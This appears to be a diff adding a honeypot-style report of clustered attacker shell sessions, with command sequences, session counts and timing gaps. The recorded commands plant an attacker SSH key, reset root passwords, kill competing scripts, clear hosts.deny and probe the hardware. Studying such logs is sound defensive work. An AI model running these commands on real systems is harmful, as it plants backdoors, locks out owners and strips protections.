+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:P1ALAcaWKDqm"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  gaps (s): [1.931, 12.843, 1.209, 2.179, 1.923, 1.487, 4.003, 1.761, 5.223, 1.435, 0.375, 1.215, 0.729, 1.236]
+
+=== family c6da0f07a0a0ce9f  sequence c18d76457275e59e  sessions=14  ips=14  exact_variants=14  lines=12
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:sa8okcbuJtKz"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  gaps (s): [1.618, 11.102, 2.147, 2.208, 2.995, 2.016, 1.627, 2.254, 2.0, 1.747, 1.635]
+
+=== family c6da0f07a0a0ce9f  sequence d2d8278c7b9e456b  sessions=14  ips=14  exact_variants=14  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "p@ssw0rd\nFQdTq9aIiL5I\nFQdTq9aIiL5I"|passwd|bash
+   5. echo "p@ssw0rd\nFQdTq9aIiL5I\nFQdTq9aIiL5I\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.102, 5.687, 2.214, 2.473, 2.204, 1.953, 1.999, 2.233, 2.185, 2.154, 2.194, 2.1, 2.31, 2.345, 2.358, 1.935, 2.136]
+
+=== family c6da0f07a0a0ce9f  sequence f184d04142c2fd1f  sessions=13  ips=13  exact_variants=13  lines=7
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:nEJFcXk3mQuK"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+  gaps (s): [2.068, 7.683, 1.921, 2.236, 2.036, 1.903]
+
+=== family c6da0f07a0a0ce9f  sequence 06e73415e61902f0  sessions=12  ips=12  exact_variants=12  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "Password!\nVX3SLFHyMFHP\nVX3SLFHyMFHP"|passwd|bash
+   5. echo "Password!\nVX3SLFHyMFHP\nVX3SLFHyMFHP\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.089, 5.55, 2.881, 3.057, 2.872, 2.354, 2.658, 2.887, 2.791, 2.562, 2.75, 2.434, 2.985, 2.98, 3.045, 3.093, 2.612]
+
+=== family c6da0f07a0a0ce9f  sequence 2bba8b429a1f279e  sessions=12  ips=12  exact_variants=12  lines=8
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:zCAC8hIE7AzD"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+  gaps (s): [2.548, 8.382, 2.28, 2.442, 2.095, 2.192, 2.093]
+
+=== family c6da0f07a0a0ce9f  sequence 6f356d615401d04d  sessions=12  ips=12  exact_variants=12  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "Aa111111!\nBGfn3N48W6pM\nBGfn3N48W6pM"|passwd|bash
+   5. echo "Aa111111!\nBGfn3N48W6pM\nBGfn3N48W6pM\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.403, 7.303, 2.567, 2.407, 2.509, 2.496, 2.405, 2.586, 2.531, 2.479, 2.688, 2.506, 3.915, 4.737, 3.318, 3.098, 3.242]
+
+=== family c6da0f07a0a0ce9f  sequence 943c7dbc72283737  sessions=12  ips=12  exact_variants=12  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cat /proc/cpuinfo | grep name | wc -l
+   3. echo "root:zESWrheE1gZm"|chpasswd|bash
+   4. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   5. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   6. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   7. ls -lh $(which ls)
+   8. crontab -l
+   9. w
+  10. uname -m
+  11. cat /proc/cpuinfo | grep model | grep name | wc -l
+  12. top
+  13. uname
+  14. uname -a
+  15. whoami
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [16.22, 1.749, 1.785, 1.75, 2.784, 1.757, 1.885, 1.736, 1.734, 1.997, 1.74, 1.781, 1.882, 1.908, 1.753, 1.791]
+
+=== family c6da0f07a0a0ce9f  sequence ba64515ab7257ad7  sessions=12  ips=12  exact_variants=12  lines=6
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:T5DS8dqwOoXi"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+  gaps (s): [1.618, 13.998, 0.733, 0.688, 79.581]
+
+=== family c6da0f07a0a0ce9f  sequence 254870c7c32ed057  sessions=11  ips=10  exact_variants=11  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "Password\nL7jDJwLUesFi\nL7jDJwLUesFi"|passwd|bash
+   5. echo "Password\nL7jDJwLUesFi\nL7jDJwLUesFi\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [1.856, 6.986, 2.008, 2.093, 1.805, 2.054, 2.096, 1.863, 2.198, 1.78, 2.189, 2.218, 1.992, 2.614, 1.832, 2.245, 2.041]
+
+=== family c6da0f07a0a0ce9f  sequence 2b46a7e88886f76f  sessions=11  ips=10  exact_variants=11  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "qwe123\n2OHdbgMPuNzv\n2OHdbgMPuNzv"|passwd|bash
+   5. echo "qwe123\n2OHdbgMPuNzv\n2OHdbgMPuNzv\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.089, 6.649, 2.8, 3.028, 2.627, 2.763, 2.663, 2.698, 3.218, 2.618, 2.934, 2.946, 2.778, 2.701, 3.537, 3.036, 3.371]
+
+=== family c6da0f07a0a0ce9f  sequence 175a92305f75e9d2  sessions=10  ips=9  exact_variants=10  lines=13
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:ZWZ6ox3sd311"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  gaps (s): [2.154, 7.834, 2.064, 1.853, 2.332, 2.013, 2.229, 2.009, 2.113, 2.041, 2.252, 1.945]
+
+=== family c6da0f07a0a0ce9f  sequence dec5b9c10b349f12  sessions=10  ips=10  exact_variants=10  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "M3gaP33!\nnvo9hjJRA5kT\nnvo9hjJRA5kT"|passwd|bash
+   5. echo "M3gaP33!\nnvo9hjJRA5kT\nnvo9hjJRA5kT\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.27, 4.717, 2.394, 1.967, 2.395, 2.179, 2.217, 2.367, 1.977, 2.293, 2.219, 2.161, 2.396, 1.996, 2.3, 2.357, 2.311]
+
+=== family c6da0f07a0a0ce9f  sequence 117cc8608c34b7d9  sessions=9  ips=9  exact_variants=9  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "ubuntu\n07D7Ey8MR5ai\n07D7Ey8MR5ai"|passwd|bash
+   5. echo "ubuntu\n07D7Ey8MR5ai\n07D7Ey8MR5ai\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [5.577, 10.216, 2.816, 2.678, 2.574, 2.627, 2.669, 2.823, 2.609, 4.378, 3.247, 3.057, 3.196, 3.085, 3.11, 2.936, 3.128]
+
+=== family c6da0f07a0a0ce9f  sequence 31f948551a386c61  sessions=9  ips=9  exact_variants=9  lines=16
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:SJotBwkzGIs9"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  gaps (s): [1.46, 7.759, 1.979, 1.529, 2.623, 1.915, 2.065, 2.089, 2.495, 2.454, 2.351, 4.154, 4.142, 4.523, 2.425]
+
+=== family c6da0f07a0a0ce9f  sequence 6735c40a28540619  sessions=9  ips=9  exact_variants=9  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:RTxXsHoyeII0"|chpasswd|bash
+   5. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   6. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   7. ls -lh $(which ls)
+   8. crontab -l
+   9. w
+  10. uname -m
+  11. cat /proc/cpuinfo | grep model | grep name | wc -l
+  12. top
+  13. uname
+  14. uname -a
+  15. whoami
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [10.973, 9.72, 3.351, 10.534, 1.295, 2.215, 3.886, 2.302, 4.096, 4.947, 5.433, 5.315, 4.771, 8.052, 6.192, 3.679]
+
+=== family c6da0f07a0a0ce9f  sequence 739b986d6f7a3f18  sessions=9  ips=9  exact_variants=9  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "1qaz@WSX\nUM7dlXDn1q9Y\nUM7dlXDn1q9Y"|passwd|bash
+   5. echo "1qaz@WSX\nUM7dlXDn1q9Y\nUM7dlXDn1q9Y\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.948, 7.564, 4.072, 3.681, 3.672, 3.379, 3.562, 3.383, 3.435, 3.604, 3.627, 3.292, 3.665, 3.273, 3.476, 3.557, 3.61]
+
+=== family c6da0f07a0a0ce9f  sequence a023163d2ea16510  sessions=8  ips=8  exact_variants=8  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "jack\nJofqQf2ZB3AG\nJofqQf2ZB3AG"|passwd|bash
+   5. echo "jack\nJofqQf2ZB3AG\nJofqQf2ZB3AG\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.941, 7.089, 2.829, 3.042, 2.971, 3.619, 3.358, 2.935, 3.351, 3.059, 2.914, 3.35, 2.69, 3.137, 3.019, 2.852, 3.117]
+
+=== family c6da0f07a0a0ce9f  sequence d2236cb294b8cdd9  sessions=8  ips=8  exact_variants=8  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "changeme\nZVwrcb0bKv1U\nZVwrcb0bKv1U"|passwd|bash
+   5. echo "changeme\nZVwrcb0bKv1U\nZVwrcb0bKv1U\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.803, 18.643, 2.615, 6.374, 2.832, 2.82, 3.255, 4.606, 3.021, 2.794, 3.4, 3.419, 3.162, 2.964, 2.982, 3.559, 2.817]
+
+=== family c6da0f07a0a0ce9f  sequence f3806c7f04941c0d  sessions=8  ips=8  exact_variants=8  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "postgres\ntfwHQqL7dtGK\ntfwHQqL7dtGK"|passwd|bash
+   5. echo "postgres\ntfwHQqL7dtGK\ntfwHQqL7dtGK\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.487, 5.105, 2.166, 2.059, 2.099, 2.628, 1.942, 2.407, 2.105, 2.578, 2.255, 2.395, 2.015, 2.292, 2.235, 2.038, 2.536]
+
+=== family c6da0f07a0a0ce9f  sequence 788d60de66c4478c  sessions=7  ips=7  exact_variants=7  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:jm6FCYf4AAFy"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. ls -lh $(which ls)
+   8. crontab -l
+   9. w
+  10. uname -m
+  11. cat /proc/cpuinfo | grep model | grep name | wc -l
+  12. top
+  13. uname
+  14. uname -a
+  15. whoami
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.536, 11.872, 2.456, 2.905, 2.228, 9.598, 2.762, 2.399, 2.549, 2.758, 3.798, 1.956, 2.016, 3.342, 3.387, 3.24]
+
+=== family c6da0f07a0a0ce9f  sequence 8e56691a1bbc2322  sessions=7  ips=7  exact_variants=7  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "welcome\n8GZSKUoR4dhZ\n8GZSKUoR4dhZ"|passwd|bash
+   5. echo "welcome\n8GZSKUoR4dhZ\n8GZSKUoR4dhZ\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
